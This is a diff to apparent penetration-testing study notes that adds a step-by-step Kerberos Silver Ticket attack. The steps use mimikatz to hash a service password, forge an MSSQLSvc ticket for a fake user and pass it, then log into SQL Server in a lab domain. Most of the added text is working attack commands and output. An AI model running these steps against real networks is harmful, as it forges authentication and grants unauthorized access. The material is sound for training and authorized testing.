@@ -662,7 +662,7 @@ mimikatz # kerberos::list /export
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
 ```
 
-### 3.1.3. Creack the ticket to retrieve service account password (brute force)
+### 3.1.3. Crack the ticket to retrieve service account password (brute force)
 
 ```console
 ┌──(kali㉿kali)-[~]
@@ -675,12 +675,97 @@ Successfully cracked all tickets
 ```
 
 ## 3.2. Silver Ticket
+### 3.2.1. Retrieve domain's numeric identifier
+
+Security Identifier or SID format: `S-R-I-S`
+- `S` - A literal `S` to identify the string as a SID
+- `R` - Revision level, usually set to `1`
+- `I` - Identifier-authority value, often `5` within AD
+- `S` - Subauthority values:
+  - Domain's numeric identifier, e.g. `21-1470288461-3401294743-676794760`
+  - Relative identifier or RID representing the specific object in the domain, e.g. `1105`
 
 ```console
-kerberos::purge
-kerberos::list
-kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
-kerberos::list
+C:\Users\mike>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name SID
+========= =============================================
+lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
+```
+
+### 3.2.2. Generate hash value for service account password
+```console
+mimikatz # kerberos::hash /password:P@ssw0rd
+        * rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
+        * aes128_hmac       f67365e0a00838aff75e6ca33f3c2be2
+        * aes256_hmac       9e0de99003a18068f2e2186cd1162e9b6398f7b873854ccf16040ce16aa06d26
+        * des_cbc_md5       76fdfece25e3da54
+```
+
+### 3.2.3. Purge existing kerberos tickkets
+```console
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+```
+
+### 3.2.4. Generate KRB_TGS ticket
+- ☝️ **Note**: The service identifies the user using the SID, the user name can be anything like `nonexistentuser`
+
+```console
+mimikatz # kerberos::golden /user:nonexistentuser /domain:LAB.VX /sid:S-1-5-21-1470288461-3401294743-676794760 /id:1105 /target:svr.lab.vx:1433 /service:MSSQLSvc /rc4:e19ccf75ee54e06b06a5907af13cef42 /ptt
+User      : nonexistentuser
+Domain    : LAB.VX (LAB)
+SID       : S-1-5-21-1470288461-3401294743-676794760
+User Id   : 1105
+Groups Id : *513 512 520 518 519
+ServiceKey: e19ccf75ee54e06b06a5907af13cef42 - rc4_hmac_nt
+Service   : MSSQLSvc
+Target    : svr.lab.vx:1433
+Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
+```
+
+### 3.2.5. Verify ticket
+```console
+C:\Users\dummy>klist
+
+Current LogonId is 0:0x3441a5
+
+Cached Tickets: (1)
+
+#0>     Client: nonexistentuser @ LAB.VX
+        Server: MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 4/18/2022 9:15:16 (local)
+        End Time:   4/15/2032 9:15:16 (local)
+        Renew Time: 4/15/2032 9:15:16 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+```
+
+### 3.2.6. Attempt login to service
+```console
+C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
+1> SELECT SYSTEM_USER;
+2> GO
+
+--------------------------------------------------------------------------------------------------------------------------------
+LAB\nonexistentuser
+
+(1 rows affected)
 ```
 
 # 5. Golden Ticket
